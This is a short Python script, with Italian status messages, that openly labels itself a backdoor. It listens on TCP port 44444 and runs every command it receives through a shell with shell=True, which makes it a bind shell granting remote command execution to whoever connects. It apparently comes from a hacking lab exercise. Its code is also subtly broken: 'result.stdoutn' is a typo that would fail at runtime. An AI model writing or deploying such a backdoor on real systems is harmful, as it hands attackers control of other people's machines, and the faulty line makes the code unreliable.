import socket as soc
import subprocess

SRV_ADDR = "10.0.2.15"
SRV_PORT = 44444

s = soc.socket(soc.AF_INET, soc.SOCK_STREAM)
address = (SRV_ADDR, SRV_PORT)
s.bind(address)
s.listen(1)
print(f"il servizio e' avviato: attnedo connessioni in entrata su {SRV_PORT}")
connection, addressClient = s.accept()
print("sono connesso con l'indirizzo", addressClient)
connection.sendall(b"Backdoor in attesa di comando!\n")
while True:
    data = connection.recv(1024)
    if not data: break
    command = data.decode("UTF-8")
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE)
    connection.sendall(result.stdoutn)
    print(command)
connection.close()